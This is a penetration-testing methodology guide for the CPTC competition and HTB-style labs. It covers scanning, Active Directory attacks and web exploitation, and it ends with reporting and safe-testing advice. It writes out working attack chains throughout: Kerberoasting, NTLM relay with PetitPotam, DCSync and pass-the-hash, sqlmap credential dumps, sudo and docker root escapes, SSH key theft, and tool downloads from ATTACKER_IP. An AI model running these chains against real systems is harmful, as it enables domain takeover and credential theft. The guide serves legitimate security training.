# Complete Network Penetration Test Methodology
Based on IppSec's HTB methodology, PTES framework, and other CPTC team strategies.

---

## The Professional 7-Phase Methodology (PTES) 

### Phase 1: Pre-Engagement (Before Competition)

- Read scope document carefully
- Note off-limits systems
- Understand client scenario 


### Phase 2: Intelligence Gathering

**Goal:** Discover ALL assets and categorize them

**Network Discovery:**
```bash
# 1. Find live hosts (5 minutes)
nmap -sn 10.10.10.0/24 -oG live_hosts.txt
grep "Up" live_hosts.txt | cut -d' ' -f2 > targets.txt

# 2. Quick port scan (10 minutes)
nmap -iL targets.txt --top-ports 1000 -oA quick_scan

# 3. Start comprehensive scan (background, 30+ minutes)
nmap -p- -sV -sC -iL targets.txt -oA full_scan &

# 4. Start AutoRecon on all targets (background)
autorecon -t targets.txt -o ~/results/ &
```

**Asset Categorization:**
```
Create spreadsheet/document with:

Domain Controllers:
- 10.10.10.10 (DC01) - Ports: 88,389,445,3389

Web Servers:
- 10.10.10.50 (WEB01) - Ports: 80,443
- 10.10.10.51 (WEB02) - Ports: 8080

Database Servers:
- 10.10.10.60 (SQL01) - Port: 1433
- 10.10.10.70 (CACHE01) - Port: 6379

File Servers:
- 10.10.10.80 (FILES01) - Ports: 445,2049

Linux Systems:
- 10.10.10.90 (APP01) - Port: 22

Workstations:
- 10.10.10.100-120 (DESK01-20) - Port: 3389
```

### Phase 3: Vulnerability Analysis

**Don't exploit yet! Just identify vulnerabilities.**

**Quick Win Detection:**
```bash
# SNMP with default community strings
sudo nmap -sU -p 161 --open 10.10.10.0/24
for ip in $(cat snmp_hosts.txt); do
    snmpwalk -v2c -c public $ip | grep -i "password\|credential"
done

# Redis without authentication
for ip in $(cat redis_hosts.txt); do
    redis-cli -h $ip ping 2>/dev/null && echo "$ip has no auth!"
done

# NFS exports
for ip in $(cat nfs_hosts.txt); do
    showmount -e $ip
done

# Default credentials
# Try admin:admin, root:root on all services
```

**Active Directory Vulnerability Detection:**
```bash
# Assumes you have ANY domain credentials

# 1. SMB Signing Check (CRITICAL if disabled on DC)
netexec smb DC_IP --gen-relay-list relay_targets.txt
cat relay_targets.txt  # Is DC in here?

# 2. AS-REP Roasting
impacket-GetNPUsers DOMAIN/USER:PASS -dc-ip DC_IP -request -outputfile asrep.txt

# 3. Kerberoasting
impacket-GetUserSPNs DOMAIN/USER:PASS -dc-ip DC_IP -request -outputfile kerberoast.txt

# 4. Start cracking (background)
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt &
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt &

# 5. BloodHound collection
bloodhound-python -u USER -p 'PASS' -d DOMAIN -ns DC_IP -c All --zip

# 6. Share enumeration
netexec smb 10.10.10.0/24 -u USER -p 'PASS' --shares
```

**Web Application Vulnerability Detection:**
```bash
# For each web app:

# 1. Technology fingerprinting
whatweb http://TARGET

# 2. Directory enumeration
gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt -x php,html,txt

# 3. Check for quick wins
curl http://TARGET/.git/config
curl http://TARGET/.env
curl http://TARGET/robots.txt

# 4. If WordPress:
wpscan --url http://TARGET --enumerate vp,vt,u --api-token TOKEN

# 5. Manual testing in Burp
# - SQLi on all inputs
# - XSS on all inputs  
# - File upload if present
# - Auth bypass attempts
```


### Phase 4: Exploitation

**Priority 1: Services That Give Credentials**

These are your quick wins that unlock more access:

```bash
# SNMP credential extraction (5 min each)
snmpwalk -v2c -c public TARGET > snmp_output.txt
grep -i "password\|credential" snmp_output.txt
# → Test found credentials immediately on SSH/SMB/databases

# Redis to root (2 minutes)
# If redis-cli -h TARGET ping works:
# → Follow redis SSH key injection (see service playbook)
# → Instant root shell

# NFS SSH key theft (10 minutes)
# If /home exported:
sudo mount -t nfs TARGET:/home /mnt/nfs
find /mnt/nfs -name "id_rsa"
# → Copy key, SSH as that user

# MySQL default credentials (3 minutes)
mysql -h TARGET -u root
# → Extract database, find credentials in tables
# → Test credentials on other services
```

**Priority 2: Active Directory Compromise**

**If SMB Signing Disabled:**
```bash
# Terminal 1:
impacket-ntlmrelayx -t ldaps://DC_IP --escalate-user LOWPRIV_USER --delegate-access

# Terminal 2:
python3 PetitPotam.py -u LOWPRIV_USER -p 'PASS' ATTACKER_IP DC_IP

# Terminal 1 shows success, then:
impacket-secretsdump 'DOMAIN/LOWPRIV_USER:PASS@DC_IP' -just-dc

# → Domain Admin achieved
# → CRITICAL finding created
# → Move on to other targets
```

**If Kerberoasting Successful:**
```bash
# Crack service account password
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt

# Test cracked credentials
netexec smb 10.10.10.0/24 -u SERVICE_ACCOUNT -p 'CRACKED_PASS'
netexec mssql 10.10.10.0/24 -u SERVICE_ACCOUNT -p 'CRACKED_PASS'

# Often service accounts have admin on SQL servers
# → Access SQL server
# → Enable xp_cmdshell
# → Command execution
# → Pivot from there
```

**Priority 3: Web Application Exploitation**

```bash
# SQL Injection workflow:
# 1. Confirm manually
curl "http://TARGET/page.php?id=1'"  # Error?

# 2. Extract database
# Manual UNION queries or sqlmap

# 3. Find credentials in database 

# 4. Test credentials everywhere 
# → SSH, SMB, RDP, other web apps

# 5. Document 
```

### Phase 5: Post-Exploitation

**Once you have shells, escalate privileges and pivot**

**Privilege Escalation Workflow:**

Linux:
```bash
# 1. Stabilize shell 
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z, then: stty raw -echo; fg

# 2. Quick manual checks
sudo -l  # Most important!
id  # Groups?
find / -perm -4000 -type f 2>/dev/null  # SUID

# 3. Run LinPEAS
wget http://ATTACKER_IP/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh

# 4. Review output and exploit 
# - sudo with NOPASSWD → GTFOBins
# - Docker group → docker mount exploit
# - SUID binary → specific exploit
# - Writable /etc/passwd → add root user

# 5. If no clear path after a good amount of time... move on
# Document current access level
```

Windows:
```bash
# 1. Basic enumeration
whoami /priv
whoami /groups

# 2. Run WinPEAS 
certutil -urlcache -f http://ATTACKER_IP/winPEAS.exe winPEAS.exe
.\winPEAS.exe

# 3. Exploit obvious wins
# - SeImpersonate → PrintSpoofer/GodPotato
# - AlwaysInstallElevated → MSI exploit
# - Unquoted service path → binary replacement

# 4. If stuck after awhile move on
```

**Lateral Movement:**
```bash
# Test EVERY credential on EVERY service

# Example: Found database password "DbPass2024!"
PASSWORD="DbPass2024!"

# Test on all SSH
netexec ssh 10.10.10.0/24 -u root -p "$PASSWORD"
netexec ssh 10.10.10.0/24 -u admin -p "$PASSWORD"

# Test on all SMB  
netexec smb 10.10.10.0/24 -u administrator -p "$PASSWORD"
netexec smb 10.10.10.0/24 -u admin -p "$PASSWORD"

# Test on all databases
netexec mssql 10.10.10.0/24 -u sa -p "$PASSWORD"
mysql -h TARGET -u root -p"$PASSWORD"

# Test on all web apps (admin panels)
```

### Phase 6: Reporting

Review ALL GhostWriter findings:
```
For each finding:
- [ ] Clear title describing impact
- [ ] Accurate severity with justification
- [ ] Complete description
- [ ] Business impact (money, compliance, operations)
- [ ] At least 3 screenshots showing:
  - Vulnerability exists
  - Exploitation successful
  - Impact demonstrated
- [ ] Complete reproduction steps (copy-paste ready)
- [ ] Specific remediation (not generic "update software")
- [ ] References (CVE, CWE, OWASP, compliance)
```

**Report Generation**
```bash
# 1. In GhostWriter: Project → Generate Report
# 2. Select template
# 3. Choose findings to include
# 4. Preview before export
# 5. Export as .docx
```

**Final Review**
- Read executive summary (non-technical language?)
- Verify all technical details accurate
- Check spelling/grammar
- Ensure findings ordered by severity
- Verify all screenshots load properly
- Final export and submit
---

## Real-World Tool Chaining Examples

### Example 1: Web App → Database → Lateral Movement

**IppSec's systematic approach:**

```bash
# 1. nmap discovers HTTP (port 80)
nmap -p- -sV 10.10.10.50

# 2. gobuster finds admin panel
gobuster dir -u http://10.10.10.50 -w /usr/share/wordlists/dirb/common.txt

# 3. SQL injection in admin login
sqlmap -u "http://10.10.10.50/admin/login.php" --forms --batch --dbs

# 4. Dump credentials from database
sqlmap -u "http://10.10.10.50/admin/login.php" -D webapp -T users --dump

# 5. Extract: admin:$2y$10$hash (bcrypt)
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt

# 6. Cracked: admin:Welcome2024!

# 7. Test password EVERYWHERE
netexec ssh 10.10.10.0/24 -u admin -p 'Welcome2024!'
netexec smb 10.10.10.0/24 -u admin -p 'Welcome2024!'
# → Works on 10.10.10.60 (database server)

# 8. SSH to database server
ssh admin@10.10.10.60

# 9. Check sudo
sudo -l
# → (ALL : ALL) NOPASSWD: /usr/bin/vim

# 10. GTFOBins vim exploit
sudo vim -c ':!/bin/sh'

# 11. Now root on database server!
```

**Each tool's output directly enabled the next tool.**

### Example 2: SNMP → SSH → Docker → Root

**From professional practitioner blog:**

```bash
# 1. nmap finds SNMP (port 161/udp)
sudo nmap -sU -p 161 10.10.10.80

# 2. snmpwalk with default community
snmpwalk -v2c -c public 10.10.10.80 > snmp.txt

# 3. Search for credentials
grep -i "password" snmp.txt
# → Found: "backup.sh --password BackupPass2024!"

# 4. Test on SSH
ssh backup@10.10.10.80
# Password: BackupPass2024!
# → Success!

# 5. Check groups
id
# → uid=1001(backup) gid=1001(backup) groups=1001(backup),999(docker)

# 6. Docker group = instant root
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# → root@host

# 7. Read root's SSH key
cat /root/.ssh/id_rsa

# 8. Test key on other systems
ssh -i root_key root@10.10.10.10
# → Access to Domain Controller!
```

### Example 3: SMB Signing Disabled → Domain Admin

```bash
# 1. NetExec checks SMB signing (2 minutes)
netexec smb 10.10.10.10 --gen-relay-list relay.txt
# → DC in list = signing not required

# 2. Setup NTLM relay (1 minute)
impacket-ntlmrelayx -t ldaps://10.10.10.10 --escalate-user jsmith --delegate-access

# 3. Coerce authentication (30 seconds)
python3 PetitPotam.py -u jsmith -p 'Welcome2024!' ATTACKER_IP 10.10.10.10
# → Relay successful, jsmith escalated

# 4. DCSync attack (3 minutes)
impacket-secretsdump 'DOMAIN/jsmith:Welcome2024!@10.10.10.10' -just-dc
# → 247 account hashes extracted including Administrator

# 5. Pass-the-hash (1 minute)
impacket-psexec -hashes :ADMIN_HASH Administrator@10.10.10.10
# → SYSTEM shell on DC
# → Domain Admin achieved

# 6. Document complete attack chain (5 minutes)
# → CRITICAL finding
```
---

## Time-Boxed Testing Strategy

### The 30-40 Minute Rule Per Target

**Per System Budget:**
```
Minutes 0-10: Enumeration
- Service version detection
- Quick vulnerability checks
- Technology fingerprinting

Minutes 10-25: Exploitation attempts
- Try 2-3 different attack vectors
- Test credentials
- Attempt known exploits

Minutes 25-30: Documentation
- Create GhostWriter finding
- Upload screenshots
- Save command output

Minute 30: MOVE TO NEXT TARGET

If you haven't compromised after 30 minutes:
- Document what you found
- Note what you tried
- Mark for potential return
- Move on
```

**Exception:** If you're actively making progress and breakthrough seems imminent, take an extra 10 minutes. But set a hard stop at 40 minutes total.

---

## Professional Workflows in Practice

### IppSec's Systematic HTB Methodology

From 400+ documented machine walkthroughs:

**Every machine follows identical structure:**
1. Comprehensive nmap (ports, services, versions, scripts)
2. Manual enumeration of every discovered service
3. Directory brute-forcing if HTTP/HTTPS
4. Technology identification (whatweb, wappalyzer)
5. Exploit database searching (searchsploit)
6. Manual exploitation (understands exploit before running)
7. Shell stabilization (Python PTY)
8. Automated privesc enumeration (LinEnum/WinPEAS)
9. Manual verification of automated findings
10. Complete documentation of attack chain

**Key insight:** "Never skip enumeration, even when you think you know the path."

### Bug Bounty Hunter Workflow (Reconnaissance Focus)

Professional bug bounty hunters processing thousands of subdomains:

**Their automation chains:**
```bash
# Subdomain enumeration
subfinder -d target.com | tee subdomains.txt

# Live host filtering
cat subdomains.txt | httpx -silent | tee live_hosts.txt

# Vulnerability scanning
nuclei -l live_hosts.txt -t /root/nuclei-templates/ -o nuclei_results.txt

# JavaScript analysis for endpoints
cat live_hosts.txt | while read url; do
    echo "$url" | waybackurls | grep "\.js$" | while read js; do
        python3 linkfinder.py -i "$js" -o cli
    done
done

# Parameter fuzzing
ffuf -u "https://target.com/api/FUZZ" -w parameters.txt -mc 200
```

**Then manual validation of every automated finding in Burp Suite.**

**Lesson:** Automation provides breadth, manual testing provides depth.

---

## Automation vs Manual Testing

### When to Automate

**Always automate:**
- Network discovery (nmap, masscan)
- Service enumeration (AutoRecon)
- Directory brute-forcing (gobuster, feroxbuster)
- Subdomain discovery (subfinder, amass)
- Password cracking (hashcat in background)
- Known vulnerability scanning (nuclei)

**Automation advantages:**
- Runs in background while you work
- Consistent methodology (nothing forgotten)
- Parallel execution (10+ targets simultaneously)
- Organized output
- Frees you for complex tasks

### When to Go Manual

**Always manual:**
- SQL injection exploitation (understanding query structure)
- Business logic testing (application-specific)
- Authentication/authorization boundary testing
- Privilege escalation (environment-specific)
- Credential testing (context-dependent)
- Report writing

**Manual advantages:**
- Adapts to specific environment
- Detects logic flaws automation misses
- Lower false positive rate
- Required for complex vulnerabilities
- Professional judgment on impact

### Approach

```bash
# Start automation
autorecon 10.10.10.0/24 -o ~/results/ &
nmap -p- -iL targets.txt -oA full_scan &
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt &
```

```bash
# Manual testing while automation runs
# - Quick wins (SNMP, Redis, default creds)
# - Web app testing in Burp
# - AD attacks with found credentials
# - Review AutoRecon results as they complete
```

```bash
# Review all automated output
# - Parse AutoRecon _manual_commands.txt
# - Check for missed findings
# - Document everything
# - Generate report
```

---

## Safe Testing Practices (Critical for Simulated Environments)

### What Can Break Things

**Dangerous actions:**
- Password spraying with low lockout threshold (causes account lockouts)
- Aggressive port scans on ICS/SCADA systems (can crash them)
- Running multiple vulnerability scanners simultaneously (DoS)
- `--script vuln` on production-looking systems (exploits can crash services)
- Kernel exploits on unknown systems (can kernel panic)
- Deleting files or modifying configurations
- Fork bombs or resource exhaustion tests

### Safe Testing Approach

**Before password spraying:**
```bash
# 1. Check password policy
netexec smb DC_IP -u USERNAME -p 'PASS' --pass-pol

# Look at:
Lockout threshold: 5  # SAFE to spray
Lockout duration: 30 minutes

Lockout threshold: 3  # DANGEROUS - one mistake = lockout
Lockout threshold: 0  # NO LOCKOUT - safe but suspicious
```

**Before aggressive scanning:**
```bash
# Start with gentle timing
nmap -T2 TARGET  # Polite timing

# Check if services respond normally
# Then increase if needed
nmap -T4 TARGET  # Aggressive (competition appropriate)
```

**Before exploiting:**
```bash
# Read the exploit code first!
searchsploit -m exploits/linux/remote/12345.py
cat 12345.py

# Understand:
# - What does it do?
# - Does it crash services?
# - Can it be recovered from?

# Then test
```

### If You Break Something

**CPTC expects this sometimes. Professionalism is key:**

1. **Document exactly what you did**
   - Command you ran
   - What happened
   - Time it occurred

2. **Notify organizers immediately**
   - Don't try to hide it
   - They can help restart services

3. **Include in your report**
   - Shows honesty and professionalism
   - "During testing, X command caused service disruption, demonstrating need for input validation"

4. **Learn from it**
   - Add to team notes: "Don't do X"
   - Adjust approach

**From Hurricane Labs (CPTC organizer):** "We expect teams to break things. It's a learning opportunity. Honesty and professionalism in handling it is what we evaluate."

---

## Organizing Your Work

### Directory Structure (Per Tester Recommendations)

```bash
# Create before starting
mkdir -p ~/pentest/{reconnaissance,exploitation,post-exploitation,loot,screenshots,notes,reports}

# Per-host organization
mkdir -p ~/pentest/hosts/10.10.10.50/{scans,exploits,loot,screenshots}

# Example usage:
nmap -p- 10.10.10.50 -oA ~/pentest/hosts/10.10.10.50/scans/full_nmap
gobuster dir -u http://10.10.10.50 -w wordlist.txt -o ~/pentest/hosts/10.10.10.50/scans/gobuster.txt
```

### Terminal Organization with tmux

**Professional setup:**
```bash
# Start tmux session
tmux new -s pentest

# Create organized windows
Ctrl+b c  # New window
Ctrl+b ,  # Rename window

# Example layout:
Window 0: "AutoRecon" - Background scans
Window 1: "Web-10.10.10.50" - Web app testing
Window 2: "AD-Attacks" - Kerberoasting, relay
Window 3: "Shells" - Active shells
Window 4: "Notes" - Documentation

# Split panes within windows
Ctrl+b %  # Vertical split
Ctrl+b "  # Horizontal split

# Navigate
Ctrl+b [arrow key]
```

---

### Console Logging

**Log everything automatically:**
```bash
# Start logging
script -a ~/pentest/console_$(date +%Y%m%d_%H%M%S).log

# All commands now logged with timestamps
# Perfect for:
# - Reproduction steps in report
# - Remembering what you did
# - Evidence of methodology
```

---